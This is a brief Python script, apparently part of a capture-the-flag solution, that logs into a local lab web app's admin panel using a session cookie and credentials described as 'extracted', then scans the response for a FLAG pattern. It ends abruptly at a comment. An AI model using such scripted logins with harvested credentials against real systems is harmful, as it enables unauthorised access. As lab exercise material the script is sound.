import requests
import urllib.parse
import re

target = "http://127.0.0.1:32780/"
admin_url = "http://127.0.0.1:32780/admin.php"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

print("="*80)
print("ADMIN PANEL FLAG SEARCH")
print("="*80)

# Login with extracted credentials
print("\n[+] Logging into admin panel...")
login_data = {
    'username': 'Blog Home', 
    'password': 'Blog Home'
}

r_login = session.post(admin_url, data=login_data)
print(f"Login status: {r_login.status_code}")
print(f"Response size: {len(r_login.text)} bytes")

# Search for flag in admin panel response
print("\n[+] Searching admin panel content for FLAG...")

# Check for flag pattern
flag_pattern = re.compile(r'FLAG\{[^}]+\}')
flag_match = flag_pattern.search(r_login.text)

if flag_match:
    flag = flag_match.group(0)
    print(f"\n[!] FLAG FOUND IN ADMIN PANEL RESPONSE!")
    print(f"[!] FLAG: {flag}")
else:
    print("[-] No flag found in initial admin panel response")
    
    # Display admin panel content to see what's accessible
